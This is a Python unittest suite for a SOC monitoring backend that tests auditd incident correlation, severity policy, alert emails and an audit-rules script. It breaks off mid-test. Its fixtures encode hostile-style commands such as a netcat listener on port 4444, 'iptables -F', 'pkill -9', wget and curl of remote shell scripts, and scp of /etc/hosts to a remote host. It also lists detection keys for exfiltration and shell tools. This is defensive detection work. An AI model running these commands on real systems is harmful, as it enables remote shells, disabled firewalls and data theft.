import os
import json
import time
import shutil
import sqlite3
import tempfile
import unittest
from unittest.mock import patch

os.environ["TESTING"] = "1"
os.environ["SECRET_KEY"] = "test-secret-key-32-chars-long-abc"
os.environ["DB_PASSWORD"] = "testpassword"

import app as app_module
import database as db
import ses_mailer


class TestAuditdCoverageAndDedup(unittest.TestCase):
    """
    Acceptance & Integration Test Suite (T1 - T5 + Multi-Pair Correlation Safety + Shadow Mode)
    Uses a real temporary SQLite database via SQLiteConnectionWrapper (not mocked SQL returns)
    to verify actual SQL execution, schema compatibility, merge updates, reversible audit trails,
    event-timestamp correlation windows, and Option B zero-downtime rollout.
    """

    def setUp(self):
        self.tmp_dir = tempfile.mkdtemp(prefix="bsmart_corr_test_")
        self.db_path = os.path.join(self.tmp_dir, "test_soc.db")
        self._orig_connect = sqlite3.connect

        def _temp_get_conn():
            conn = self._orig_connect(self.db_path)
            conn.row_factory = sqlite3.Row
            return db.SQLiteConnectionWrapper(conn)

        self._conn_patcher = patch.object(db, "get_db_connection", side_effect=_temp_get_conn)
        self._conn_patcher.start()

        # Disable live email dispatch threads during tests
        self._mail_patcher = patch.object(ses_mailer, "send_smart_alert_email", return_value=True)
        self._mail_patcher.start()

        db.init_db()
        db.set_correlation_shadow_mode(False)
        db._SERVER_PID_HISTORY.clear()
        db._SERVER_LATEST_PROCESSES.clear()
        app_module._dedup_alerts_cache.clear()
        app_module._last_known_server_user.clear()
        app_module._known_server_ports.clear()
        app_module._recent_admin_actions.clear()
        ses_mailer._CRITICAL_EMAIL_DEDUP.clear()

        # Seed two isolated test assets (#14 JVVNL-Ticket Resolve and #15 Mitra 1)
        with db.get_db_connection() as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "INSERT INTO servers (id, name, hostname, ip, ip_address, status, is_maintenance) "
                    "VALUES (14, 'JVVNL- Ticket Resolve', 'jvvnl-ticket', '192.168.150.14', '192.168.150.14', 'online', 0);"
                )
                cur.execute(
                    "INSERT INTO servers (id, name, hostname, ip, ip_address, status, is_maintenance) "
                    "VALUES (15, 'Mitra 1', 'mitra-1', '192.168.150.15', '192.168.150.15', 'online', 0);"
                )
                cur.execute(
                    "INSERT OR REPLACE INTO settings (key, value) VALUES ('email_notifications_enabled', 'true');"
                )

    def tearDown(self):
        db.set_correlation_shadow_mode(False)
        self._mail_patcher.stop()
        self._conn_patcher.stop()
        shutil.rmtree(self.tmp_dir, ignore_errors=True)

    def _fetch_open_incidents(self, server_id=None):
        with db.get_db_connection() as conn:
            with conn.cursor() as cur:
                if server_id is not None:
                    cur.execute("SELECT * FROM incidents WHERE server_id = %s AND status = 'open' ORDER BY id ASC;", (server_id,))
                else:
                    cur.execute("SELECT * FROM incidents WHERE status = 'open' ORDER BY id ASC;")
                return cur.fetchall()

    def _fetch_corr_logs(self, server_id):
        with db.get_db_connection() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT * FROM incident_correlation_log WHERE server_id = %s ORDER BY id ASC;", (server_id,))
                return cur.fetchall()

    # -------------------------------------------------------------------------
    # T1: pkill -9 against Tomcat by named user -> ONE attributed CRITICAL incident
    # -------------------------------------------------------------------------
    def test_t1_pkill_merges_with_service_stopped_both_orders_real_sql(self):
        """
        T1 (Order A & Order B on real DB):
        When user 'manoj.kn' runs `pkill -9 java` AND Tomcat/Java app transitions to stopped:
        - Order A (audit + regex command arrive first, then service_stopped):
          Produces ONLY ONE incident row (merged across MASS_PROCESS_KILL, AUDIT_PROCESS_KILL, service_stopped).
        - Order B (service_stopped arrives first as WARNING, then pkill arrives 4s later):
          Updates the existing open incident into ONE CRITICAL attributed incident.
        """
        base_ts = time.time() - 5.0
        # --- Order A: run detection engine with BOTH auditd event (proctitle) & command log + service_stopped ---
        pkill_hex = "pkill\x00-9\x00java".encode("utf-8").hex()
        payload = {
            "event_ts": base_ts + 2.0,
            "audit_events": [{
                "serial": 9001,
                "epoch": base_ts,
                "key": "process_kill",
                "auid": "1742601378",
                "username": "manoj.kn",
                "effective_user": "root",
                "comm": "pkill",
                "exe": "/usr/bin/pkill",
                "pid": "24100",
                "line": f'type=SYSCALL msg=audit({base_ts:.3f}:9001): syscall=59 auid=1742601378 pid=24100 comm="pkill" exe="/usr/bin/pkill" key="process_kill" type=PROCTITLE proctitle={pkill_hex}'
            }],
            "commands": [{"command": "pkill -9 java", "user": "manoj.kn"}],
            "sudo_events": [],
            "log_lines": [],
            "file_changes": [],
        }

        with patch.object(app_module, "_is_rule_enabled", return_value=True):
            app_module.run_detection_engine(14, payload)

        # New command-tracking auditd rules (including process_kill) default to CRITICAL for SES email alerting
        pre_incs = self._fetch_open_incidents(14)
        self.assertEqual(len(pre_incs), 1, f"Overlapping pkill detections must merge into 1 incident, got: {pre_incs}")
        self.assertEqual(pre_incs[0]["severity"], "critical", "AUDIT_PROCESS_KILL should trigger CRITICAL so email fires")

        # Now seed running Java service in prev telemetry, then transition to stopped in current push
        with db.get_db_connection() as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "UPDATE servers SET detected_services = %s WHERE id = 14;",
                    (json.dumps([{"id": "java_app", "name": "Java app", "unit_name": "tomcat.service", "pid": 1488, "status": "running"}]),)
                )
        db.save_detected_services(
            server_id=14,
            services_list=[{"id": "java_app", "name": "Java app", "unit_name": "tomcat.service", "pid": None, "status": "stopped"}],
            event_ts=base_ts + 2.0,
        )

        post_incs = self._fetch_open_incidents(14)
        self.assertEqual(len(post_incs), 1, f"pkill + service_stopped must merge into EXACTLY ONE incident, got: {post_incs}")
        merged = post_incs[0]
        self.assertEqual(merged["severity"], "critical", "Confirmed service_stopped + process_kill MUST escalate to CRITICAL")
        self.assertIn("Service Terminated — Java app", merged["title"])
        self.assertIn("manoj.kn", merged["title"])
        self.assertIn("pkill -9 java", merged["title"])

        ev = json.loads(merged["evidence_data"])
        self.assertEqual(ev.get("login_user"), "manoj.kn")
        self.assertEqual(ev.get("command"), "pkill -9 java")
        self.assertTrue(len(ev.get("merged_events", [])) >= 2, "Evidence must preserve merged raw event chain")

        corr_logs = self._fetch_corr_logs(14)
        self.assertTrue(any(c["pair_type"] == "SERVICE_STOPPED_PROCESS_KILL" and c["shadow_only"] == 0 for c in corr_logs))

        # --- Order B on Server #15: service_stopped arrives FIRST, audit process_kill arrives 4s later ---
        with db.get_db_connection() as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "UPDATE servers SET detected_services = %s WHERE id = 15;",
                    (json.dumps([{"id": "tomcat", "name": "Tomcat", "unit_name": "tomcat.service", "pid": 8812, "status": "running"}]),)
                )
        db.save_detected_services(
            server_id=15,
            services_list=[{"id": "tomcat", "name": "Tomcat", "unit_name": "tomcat.service", "pid": None, "status": "stopped"}],
            event_ts=base_ts,
        )
        mid_incs = self._fetch_open_incidents(15)
        self.assertEqual(len(mid_incs), 1)
        self.assertEqual(mid_incs[0]["severity"], "warning")

        kill_hex = "kill\x00-9\x008812".encode("utf-8").hex()
        with patch.object(app_module, "_is_rule_enabled", return_value=True):
            app_module._check_unified_fim(15, {
                "audit_events": [{
                    "serial": 9055,
                    "epoch": base_ts + 4.0,
                    "key": "process_kill",
                    "auid": "1742601378",
                    "username": "manoj.kn",
                    "effective_user": "root",
                    "comm": "kill",
                    "exe": "/usr/bin/kill",
                    "pid": "24999",
                    "line": f'type=SYSCALL msg=audit({base_ts + 4.0:.3f}:9055): syscall=59 auid=1742601378 comm="kill" exe="/usr/bin/kill" key="process_kill" proctitle={kill_hex}'
                }],
                "file_changes": [],
            })

        order_b_incs = self._fetch_open_incidents(15)
        self.assertEqual(len(order_b_incs), 1, "Order B must merge by PID match into the single existing incident")
        self.assertEqual(order_b_incs[0]["severity"], "critical")
        self.assertIn("Service Terminated — Tomcat", order_b_incs[0]["title"])
        self.assertIn("manoj.kn", order_b_incs[0]["title"])

    # -------------------------------------------------------------------------
    # T2: Tomcat OOM-killed / crashed (no user) -> ONE anonymous WARNING incident
    # -------------------------------------------------------------------------
    def test_t2_oom_crash_service_stop_stays_single_anonymous_warning(self):
        """
        T2: Service crashes/OOM-killed with no process_kill audit event:
        - ONE incident created.
        - Remains WARNING (never CRITICAL without confirmed user kill).
        - Badge clearly states 'No interactive session found — possible crash/OOM'.
        - NEVER falsely attributed to any user.
        """
        with db.get_db_connection() as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "UPDATE servers SET detected_services = %s WHERE id = 14;",
                    (json.dumps([{"id": "java_app", "name": "Java app", "unit_name": "tomcat.service", "pid": 5510, "status": "running"}]),)
                )
        db.save_detected_services(
            server_id=14,
            services_list=[{"id": "java_app", "name": "Java app", "unit_name": "tomcat.service", "pid": None, "status": "stopped"}],
            event_ts=time.time(),
        )

        incs = self._fetch_open_incidents(14)
        self.assertEqual(len(incs), 1)
        inc = incs[0]
        self.assertEqual(inc["title"], "Service Stopped — Java app")
        self.assertEqual(inc["severity"], "warning")
        self.assertIn("No interactive session found — possible crash/OOM", inc["description"])
        self.assertNotIn("manoj.kn", inc["title"])
        self.assertNotIn("manoj.kn", inc["description"])
        ev = json.loads(inc["evidence_data"])
        self.assertEqual(ev.get("attribution_status"), "unattributed")

    # -------------------------------------------------------------------------
    # Correlation Safety: Host, Target, Event-Time Window, & Reversible Shadow Mode
    # -------------------------------------------------------------------------
    def test_correlation_safety_negative_controls_and_shadow_reversibility(self):
        """
        Proves all 3 correlation safety invariants + shadow mode + revert:
        1. Cross-host isolation: pkill on server #15 must NOT merge with service_stopped on server #14.
        2. Target isolation: pkill nginx on server #14 must NOT merge with Java app stopped on server #14.
        3. Event timestamp enforcement: stale replayed pkill from 1 hour ago arriving now (NOW()) must NOT correlate.
        4. Shadow mode logs planned merges in incident_correlation_log without mutating incidents.
        5. Revert restores pre-merge title/severity cleanly.
        """
        now_ts = time.time()

        # 1. Cross-host isolation (#15 pkill java vs #14 Java app stopped)
        db.log_alert(15, "AUDIT_PROCESS_KILL", "User 'manoj.kn' executed `pkill -9 java`", severity="warning", title="Process Kill (pkill -9 java) by manoj.kn", event_ts=now_ts)
        db.log_alert(14, "service_stopped", "Service 'Java app' on srv14 stopped. (No interactive session found — possible crash/OOM)", severity="warning", title="Service Stopped — Java app", event_ts=now_ts, evidence_data={"target_service": "Java app"})
        self.assertEqual(len(self._fetch_open_incidents(14)), 1)
        self.assertEqual(self._fetch_open_incidents(14)[0]["severity"], "warning", "Cross-host kill must NOT correlate")

        # 2. Target isolation (pkill -9 nginx on #14 must NOT merge with Java app stopped on #14)
        db.log_alert(14, "AUDIT_PROCESS_KILL", "User 'manoj.kn' executed `pkill -9 nginx`", severity="warning", title="Process Kill (pkill -9 nginx) by manoj.kn", event_ts=now_ts + 1.0)
        self.assertEqual(len(self._fetch_open_incidents(14)), 2, "Unrelated service target must NOT merge")

        # 3. Stale replayed timestamp (arrives right now, but event_ts was 3600s ago -> MUST NOT merge)
        stale_ts = now_ts - 3600.0
        db.log_alert(14, "AUDIT_PROCESS_KILL", "User 'attacker' executed `pkill -9 java`", severity="warning", title="Process Kill (pkill -9 java) by attacker", event_ts=stale_ts)
        self.assertEqual(len(self._fetch_open_incidents(14)), 3, "Stale replayed event_ts (3600s delta) must NOT correlate even though created_at is NOW()")

        # 4. Shadow mode test on server #15
        db.set_correlation_shadow_mode(True)
        db.log_alert(15, "service_stopped", "Service 'Java app' on srv15 stopped. (No interactive session found — possible crash/OOM)", severity="warning", title="Service Stopped — Java app", event_ts=now_ts + 2.0, evidence_data={"target_service": "Java app"})
        shadow_incs = self._fetch_open_incidents(15)
        self.assertEqual(len(shadow_incs), 2, "Shadow mode must log correlation candidate WITHOUT merging open incidents")
        shadow_logs = self._fetch_corr_logs(15)
        self.assertTrue(any(l["shadow_only"] == 1 and l["pair_type"] == "SERVICE_STOPPED_PROCESS_KILL" for l in shadow_logs))

        # 5. Live merge + reversible restore test
        db.set_correlation_shadow_mode(False)
        db.log_alert(15, "service_stopped", "Service 'Java app' on srv15 stopped again.", severity="warning", title="Service Stopped — Java app", event_ts=now_ts + 3.0, evidence_data={"target_service": "Java app"})
        merged_logs = [l for l in self._fetch_corr_logs(15) if l["shadow_only"] == 0]
        self.assertTrue(len(merged_logs) >= 1)
        merge_id = merged_logs[-1]["id"]
        self.assertTrue(db.revert_correlated_incident_merge(merge_id))
        reverted_inc = [i for i in self._fetch_open_incidents(15) if i["id"] == merged_logs[-1]["primary_incident_id"]][0]
        self.assertEqual(reverted_inc["severity"], "warning")
        self.assertNotIn("Service Terminated", reverted_inc["title"])

    # -------------------------------------------------------------------------
    # Pairs 2 & 3: Port Scan + c2_tools AND Firewall Disabled + firewall_change
    # -------------------------------------------------------------------------
    def test_pairs_2_and_3_port_c2_and_firewall_merge(self):
        """
        Verifies Pair 2 (nc -lvnp 4444 + PORT_SCAN_4444) and Pair 3 (iptables -F + FIREWALL_DISABLED)
        each merge into ONE attributed incident.
        """
        ts = time.time()
        nc_hex = "nc\x00-lvnp\x004444".encode("utf-8").hex()
        with patch.object(app_module, "_is_rule_enabled", return_value=True):
            app_module._known_server_ports[14] = {22, 80, 443}
            app_module.run_detection_engine(14, {
                "event_ts": ts,
                "audit_events": [{
                    "serial": 9101, "epoch": ts, "key": "c2_tools", "auid": "1742601378",
                    "username": "manoj.kn", "effective_user": "root", "comm": "nc", "exe": "/usr/bin/nc.openbsd",
                    "pid": "5111",
                    "line": f'type=SYSCALL msg=audit({ts:.3f}:9101): syscall=59 auid=1742601378 pid=5111 comm="nc" exe="/usr/bin/nc.openbsd" key="c2_tools" proctitle={nc_hex}'
                }],
                "open_ports": [{"port": 4444, "process": "nc", "user": "root", "pid": 5111, "ip": "0.0.0.0"}],
            })

        incs = self._fetch_open_incidents(14)
        self.assertEqual(len(incs), 1, f"nc -lvnp 4444 + PORT_SCAN_4444 must merge into 1 incident, got: {incs}")
        self.assertIn("4444", incs[0]["title"])
        self.assertIn("manoj.kn", incs[0]["title"])

        # Pair 3: firewall_change audit + FIREWALL_DISABLED command regex on server #15
        ipt_hex = "iptables\x00-F".encode("utf-8").hex()
        with patch.object(app_module, "_is_rule_enabled", return_value=True):
            app_module.run_detection_engine(15, {
                "event_ts": ts,
                "audit_events": [{
                    "serial": 9102, "epoch": ts, "key": "firewall_change", "auid": "1742601378",
                    "username": "manoj.kn", "effective_user": "root", "comm": "iptables", "exe": "/usr/sbin/iptables",
                    "line": f'type=SYSCALL msg=audit({ts:.3f}:9102): syscall=59 auid=1742601378 comm="iptables" exe="/usr/sbin/iptables" key="firewall_change" proctitle={ipt_hex}'
                }],
                "commands": [{"command": "iptables -F", "user": "manoj.kn"}],
            })
        fw_incs = self._fetch_open_incidents(15)
        self.assertEqual(len(fw_incs), 1, f"iptables -F audit + regex must merge into 1 incident, got: {fw_incs}")
        self.assertIn("manoj.kn", fw_incs[0]["title"])
        self.assertIn("iptables -F", fw_incs[0]["description"])

    # -------------------------------------------------------------------------
    # T3: Command Keys (wget, curl, scp, ssh-keygen, iptables) Default to CRITICAL (Email-Enabled)
    # -------------------------------------------------------------------------
    def test_t3_new_command_tracking_policies_and_proctitle_alerts(self):
        """
        T3: All new command keys produce properly keyed events with full decoded cmdline
        and default to CRITICAL so SES email notifications fire immediately (even when args touch /tmp/).
        Also verifies wget + curl in the same push are BOTH recorded (not collapsed into 1 by key).
        """
        ts = time.time()
        wget_hex = "wget\x00https://example.invalid/a.sh".encode("utf-8").hex()
        curl_hex = "curl\x00-s\x00https://example.invalid/b.sh".encode("utf-8").hex()
        scp_hex = "scp\x00/etc/hosts\x00root@10.0.0.2:/tmp/".encode("utf-8").hex()
        keygen_hex = "ssh-keygen\x00-t\x00ed25519".encode("utf-8").hex()

        keys_expected = [
            "recon_tools", "data_transfer", "c2_tools", "process_kill",
            "ssh_persistence", "firewall_change", "archive_staging",
            "obfuscated_exec", "scheduled_tasks_cmd", "history_tamper",
            "service_control",
        ]
        for k in keys_expected:
            self.assertIn(k, app_module._AUDIT_KEY_DESCRIPTIONS)
            self.assertEqual(db.get_audit_severity_policy(k)["default_severity"], "critical")

        with patch.object(app_module, "_is_rule_enabled", return_value=True):
            app_module._check_unified_fim(14, {
                "audit_events": [
                    {"serial": 1, "epoch": ts, "key": "recon_tools", "auid": "1742601378", "username": "manoj.kn", "comm": "wget", "exe": "/usr/bin/wget", "line": f'type=SYSCALL msg=audit({ts:.3f}:1): auid=1742601378 comm="wget" exe="/usr/bin/wget" key="recon_tools" proctitle={wget_hex}'},
                    {"serial": 2, "epoch": ts + 1, "key": "recon_tools", "auid": "1742601378", "username": "manoj.kn", "comm": "curl", "exe": "/usr/bin/curl", "line": f'type=SYSCALL msg=audit({ts+1:.3f}:2): auid=1742601378 comm="curl" exe="/usr/bin/curl" key="recon_tools" proctitle={curl_hex}'},
                    {"serial": 3, "epoch": ts + 2, "key": "data_transfer", "auid": "1742601378", "username": "manoj.kn", "comm": "scp", "exe": "/usr/bin/scp", "line": f'type=SYSCALL msg=audit({ts+2:.3f}:3): auid=1742601378 comm="scp" exe="/usr/bin/scp" key="data_transfer" proctitle={scp_hex}'},
                    {"serial": 4, "epoch": ts + 3, "key": "ssh_persistence", "auid": "1742601378", "username": "manoj.kn", "comm": "ssh-keygen", "exe": "/usr/bin/ssh-keygen", "line": f'type=SYSCALL msg=audit({ts+3:.3f}:4): auid=1742601378 comm="ssh-keygen" exe="/usr/bin/ssh-keygen" key="ssh_persistence" proctitle={keygen_hex}'},
                ],
                "file_changes": [],
            })

        incs = self._fetch_open_incidents(14)
        self.assertEqual(len(incs), 4, f"All 4 distinct commands must produce individual attributed incidents, got {len(incs)}")
        for inc in incs:
            self.assertEqual(inc["severity"], "critical", f"Command-tracking audit incident must be CRITICAL for mail alerting: {inc}")
            self.assertIn("manoj.kn", inc["title"])

    # -------------------------------------------------------------------------
    # T4 & T5: Builtin Gaps, Rule Deduplication, Zero-Downtime Option B Script
    # -------------------------------------------------------------------------
    def test_t4_and_t5_shell_builtin_gaps_and_zero_downtime_rollout_script(self):
        """
        T4 & T5:
        - /update_audit_rules.sh documents kill & history -c builtin gaps cleanly.
        - Uses `type -P` + `readlink -f` + `grep -qxF` deduplication (no `Rule exists` duplicates).
        - Covers all 19 missing commands + killall cleanly without unrestrained `-S kill` spam.
        - Monitors .bash_history truncation while ignoring normal O_APPEND logout writes.
        - Verifies zero agent modifications / restarts.
        """
        class MockRequest:
            method = "GET"
            base_url = "https://soc.vcloudengine.com/"
            query_params = {}
            headers = {}

        coro = app_module.update_audit_rules_script(MockRequest())
        try:
            coro.send(None)
            resp = None
        except StopIteration as e:
            resp = e.value

        self.assertEqual(resp.media_type, "text/x-shellscript")
        script = resp.body.decode("utf-8")

        # T4: Builtin gaps documented & targeted SIGKILL + interactive systemctl alternatives implemented
        self.assertIn("without `-9` (e.g. SIGTERM) is a shell builtin", script)
        self.assertIn("history -c", script)
        self.assertIn("-w /root/.bash_history -p wa -k history_tamper", script)
        self.assertIn("type -P", script, "Must use `type -P` so bash builtin kill resolves external binary")
        self.assertIn("-a always,exit -F arch=b64 -S kill -F a1=9 -F auid>=1000 -F auid!=-1 -k process_kill", script)
        self.assertNotIn("-S kill -k ", script, "Must NOT use unfiltered -S kill syscall watch that floods kill(pid, 0)")
        self.assertNotIn("-S kill -F auid", script, "Must require -F a1=9 before -F auid so kill(pid, 0) never fires")

        # All commands covered
        for cmd in ("wget", "curl", "scp", "rsync", "sftp", "nc", "ncat", "pkill", "killall",
                    "kill", "ssh-keygen", "iptables", "ufw", "tar", "zip", "base64", "crontab", "useradd", "passwd"):
            self.assertIn(f"add_exec_rule {cmd} ", script)
        self.assertIn("add_interactive_exec_rule systemctl service_control", script)
        self.assertIn("-w /root/.ssh/authorized_keys -p wa -k ssh_persistence", script)

        # Benign O_APPEND bash history logout ignored, while O_TRUNC / truncate tool triggers
        benign_line = 'type=SYSCALL msg=audit(1795:1): syscall=257 a2=441 exe="/usr/bin/bash" comm="bash" name="/root/.bash_history"'
        trunc_line = 'type=SYSCALL msg=audit(1795:2): syscall=257 a2=241 exe="/usr/bin/bash" comm="bash" name="/root/.bash_history"'
        tool_line = 'type=SYSCALL msg=audit(1795:3): syscall=76 exe="/usr/bin/truncate" comm="truncate" name="/root/.bash_history"'
        self.assertTrue(app_module._is_benign_bash_history_append("history_tamper", benign_line, "/usr/bin/bash", "/root/.bash_history"))
        self.assertFalse(app_module._is_benign_bash_history_append("history_tamper", trunc_line, "/usr/bin/bash", "/root/.bash_history"))
        self.assertFalse(app_module._is_benign_bash_history_append("history_tamper", tool_line, "/usr/bin/truncate", "/root/.bash_history"))

        # T5: Zero agent downtime guarantees
        self.assertIn("AGENT_PID=$(pgrep -f \"node_push_agent.py\" || true)", script)
        self.assertIn("BEFORE_COUNT=$(auditctl -l", script)
        self.assertIn("AFTER_COUNT=$(auditctl -l", script)
        self.assertIn("[VERIFIED] securepulse-agent is UNTOUCHED", script)
        self.assertNotIn("systemctl restart securepulse", script)
        self.assertNotIn("systemctl stop securepulse", script)
        self.assertNotIn("node_push_agent.py >", script)

    # -------------------------------------------------------------------------
    # Email Template Attribution & Crash Badge Verification
    # -------------------------------------------------------------------------
    def test_email_template_renders_attribution_and_crash_badge(self):
        html_merged = ses_mailer.build_alert_html(
            alert_id=59426,
            alert_title="Service Terminated — Java app (by user 'manoj.kn' via pkill -9 java)",
            alert_type="service_stopped",
            message="Service 'Java app' on JVVNL- Ticket Resolve terminated after user 'manoj.kn' executed `pkill -9 java`.",
            severity="CRITICAL",
            timestamp="2026-11-26 10:30:00",
            server_ip="192.168.150.14",
            hostname="JVVNL- Ticket Resolve",
            llm_data={"analysis": "User terminated Tomcat via pkill.", "risk": "Service outage.", "recommendations": "Investigate."}
        )
        self.assertIn("Attributed Actor", html_merged)
        self.assertIn("manoj.kn", html_merged)
        self.assertIn('<code style="color:#f87171">pkill -9 java</code>', html_merged)
        self.assertNotIn('color:#f87171">pkill -9 java)', html_merged, "Trailing closing parenthesis must not leak into cmd code span")

        html_anon = ses_mailer.build_alert_html(
            alert_id=59427,
            alert_title="Service Stopped — Java app",
            alert_type="service_stopped",
            message="Service 'Java app' on JVVNL- Ticket Resolve transitioned from running to stopped unexpectedly. (No interactive session found — possible crash/OOM)",
            severity="WARNING",
            timestamp="2026-11-26 10:35:00",
            server_ip="192.168.150.14",
            hostname="JVVNL- Ticket Resolve",
            llm_data={"analysis": "Service stopped.", "risk": "Crash.", "recommendations": "Restart."}
        )
        self.assertIn("Attribution Status", html_anon)
        self.assertIn("No interactive session found — possible crash/OOM", html_anon)
        self.assertNotIn("manoj.kn", html_anon)

    def test_symlink_shared_inode_noise_filters(self):
        """
        Verify read-only pgrep, iptables -L/-S/iptables-save, ufw status,
        Docker daemon container bridge iptables plumbing, and /update_audit_rules.sh fetches
        do NOT false-positive on shared binary inodes, and open incidents sort above closed critical rows.
        """
        ts = time.time()
        pgrep_hex = "pgrep\x00-f\x00java".encode("utf-8").hex()
        ipt_list_hex = "iptables\x00-L\x00-n".encode("utf-8").hex()
        ipt_check_hex = "/usr/sbin/iptables\x00--wait\x00-t\x00nat\x00-C\x00POSTROUTING\x00-p\x00tcp\x00-s\x00172.20.0.3\x00-d\x00172.20.0.3\x00--dport\x008001\x00-j\x00MASQUERADE".encode("utf-8").hex()
        ipt_docker_hex = "/usr/sbin/iptables\x00--wait\x00-t\x00nat\x00-I\x00DOCKER_POSTROUTING\x00-s\x00127.0.0.1".encode("utf-8").hex()
        ufw_st_hex = "ufw\x00status".encode("utf-8").hex()
        self_curl_hex = "curl\x00-fsSL\x00https://soc.bsmartone.com:3443/update_audit_rules.sh".encode("utf-8").hex()

        with patch.object(app_module, "_is_rule_enabled", return_value=True):
            app_module._check_unified_fim(14, {
                "audit_events": [
                    {"serial": 801, "epoch": ts, "key": "process_kill", "auid": "1742601378", "username": "manoj.kn", "comm": "pgrep", "exe": "/usr/bin/pgrep", "line": f'type=SYSCALL msg=audit({ts:.3f}:801): auid=1742601378 comm="pgrep" exe="/usr/bin/pgrep" key="process_kill" proctitle={pgrep_hex}'},
                    {"serial": 802, "epoch": ts, "key": "firewall_change", "auid": "1742601378", "username": "manoj.kn", "comm": "iptables", "exe": "/usr/sbin/xtables-nft-multi", "line": f'type=SYSCALL msg=audit({ts:.3f}:802): auid=1742601378 comm="iptables" exe="/usr/sbin/xtables-nft-multi" key="firewall_change" proctitle={ipt_list_hex}'},
                    {"serial": 803, "epoch": ts, "key": "firewall_change", "auid": "1742601378", "username": "manoj.kn", "comm": "ufw", "exe": "/usr/sbin/ufw", "line": f'type=SYSCALL msg=audit({ts:.3f}:803): auid=1742601378 comm="ufw" exe="/usr/sbin/ufw" key="firewall_change" proctitle={ufw_st_hex}'},
                    {"serial": 804, "epoch": ts, "key": "recon_tools", "auid": "1742601378", "username": "manoj.kn", "comm": "curl", "exe": "/usr/bin/curl", "line": f'type=SYSCALL msg=audit({ts:.3f}:804): auid=1742601378 comm="curl" exe="/usr/bin/curl" key="recon_tools" proctitle={self_curl_hex}'},
                    {"serial": 805, "epoch": ts, "key": "firewall_change", "auid": "4294967295", "username": "root", "comm": "iptables", "exe": "/usr/sbin/xtables-nft-multi", "line": f'type=SYSCALL msg=audit({ts:.3f}:805): auid=4294967295 comm="iptables" exe="/usr/sbin/xtables-nft-multi" key="firewall_change" proctitle={ipt_docker_hex}'},
                    {"serial": 806, "epoch": ts, "key": "firewall_change", "auid": "4294967295", "username": "root", "comm": "iptables", "exe": "/usr/sbin/xtables-nft-multi", "line": f'type=SYSCALL msg=audit({ts:.3f}:806): auid=4294967295 comm="iptables" exe="/usr/sbin/xtables-nft-multi" key="firewall_change" proctitle={ipt_check_hex}'},
                ],
                "file_changes": [],
            })

        # Ensure an explicit daemon AUID (4294967295) event is NEVER misattributed to another user in the same batch
        daemon_actor = app_module._resolve_server_human_actor(
            14,
            {"audit_events": [{"auid": "1002", "username": "developer", "line": 'auid=1002 comm="bash"'}, {"auid": "4294967295", "username": "root", "line": 'auid=4294967295 comm="iptables"'}]},
            'auid=4294967295 comm="iptables"',
            "firewall_change",
            explicit_auid="4294967295"
        )
        self.assertEqual(daemon_actor, "system daemon")

        self.assertEqual(len(self._fetch_open_incidents(14)), 0, "Benign shared-inode reads, Docker bridge rules, and self-rollout curls must produce 0 incidents")

        # HEAD route registered on /update_audit_rules.sh
        head_routes = [r for r in app_module.app.routes if getattr(r, "path", "") == "/update_audit_rules.sh" and "HEAD" in (getattr(r, "methods", set()) or set())]
        self.assertTrue(len(head_routes) >= 1, "HEAD /update_audit_rules.sh must be registered so curl -I succeeds")

        # Open warning incident must sort ABOVE historical closed critical incident
        with db.get_db_connection() as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "INSERT INTO incidents (title, severity, description, status, server_id, created_at, updated_at) VALUES (%s, %s, %s, %s, %s, NOW(), NOW());",
                    ("Old Closed Critical", "critical", "closed crit", "closed", 14)
                )
                cur.execute(
                    "INSERT INTO incidents (title, severity, description, status, server_id, created_at, updated_at) VALUES (%s, %s, %s, %s, %s, NOW(), NOW());",
                    ("New Open Warning", "warning", "open warn", "open", 14)
                )
        ordered = db.get_incidents(status="all", server_id=14)["items"]
        self.assertEqual(ordered[0]["title"], "New Open Warning", "Open incidents must appear before historical closed critical rows")

    def test_interactive_sigkill_syscall62_decoding_and_correlation(self):
        """
        Verify bash builtin `kill -9 837954` (syscall=62, a0=cc942, a1=9, proctitle=-bash)
        decodes cleanly to `kill -9 837954`, creates 1 CRITICAL AUDIT_PROCESS_KILL incident,
        suppresses duplicate syscall=62 emitted directly by pkill, and correlates via PID with service_stopped.
        """
        ts = time.time() - 3.0
        bash_hex = "-bash".encode("utf-8").hex()
        kill_line = (
            f'type=SYSCALL msg=audit({ts:.3f}:9201): arch=c000003e syscall=62 success=yes exit=0 '
            f'a0=cc942 a1=9 auid=1002 uid=0 pid=99100 comm="bash" exe="/usr/bin/bash" '
            f'key="process_kill" proctitle={bash_hex}'
        )
        self.assertEqual(app_module._extract_audit_cmdline(kill_line), "kill -9 837954")

        with patch.object(app_module, "_is_rule_enabled", return_value=True):
            app_module._check_unified_fim(14, {
                "audit_events": [{
                    "serial": 9201,
                    "epoch": ts,
                    "key": "process_kill",
                    "auid": "1002",
                    "username": "govind.b",
                    "effective_user": "root",
                    "comm": "bash",
                    "exe": "/usr/bin/bash",
                    "pid": "99100",
                    "line": kill_line,
                }],
                "file_changes": [],
            })
            # Redundant syscall=62 directly from pkill/killall must be ignored (already tracked via execve)
            pkill_sleep_hex = "pkill\x00-9\x00sleep".encode("utf-8").hex()
            app_module._check_unified_fim(15, {
                "audit_events": [{
                    "serial": 9202,
                    "epoch": ts,
                    "key": "process_kill",
                    "auid": "1002",
                    "username": "govind.b",
                    "effective_user": "root",
                    "comm": "pkill",
                    "exe": "/usr/bin/pkill",
                    "pid": "99101",
                    "line": (
                        f'type=SYSCALL msg=audit({ts:.3f}:9202): arch=c000003e syscall=62 success=yes exit=0 '
                        f'a0=cc942 a1=9 auid=1002 uid=0 pid=99101 comm="pkill" exe="/usr/bin/pkill" '
                        f'key="process_kill" proctitle={pkill_sleep_hex}'
                    ),
                }],
                "file_changes": [],
            })

        self.assertEqual(len(self._fetch_open_incidents(15)), 0, "Redundant syscall=62 from pkill must be skipped")

        incs = self._fetch_open_incidents(14)
        self.assertEqual(len(incs), 1)
        self.assertEqual(incs[0]["severity"], "critical")
        self.assertIn("kill -9 837954", incs[0]["title"])
        self.assertIn("govind.b", incs[0]["title"])

        # Seed running Tomcat with PID 837954 then transition to stopped -> Pair 1 PID merge
        with db.get_db_connection() as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "UPDATE servers SET detected_services = %s WHERE id = 14;",
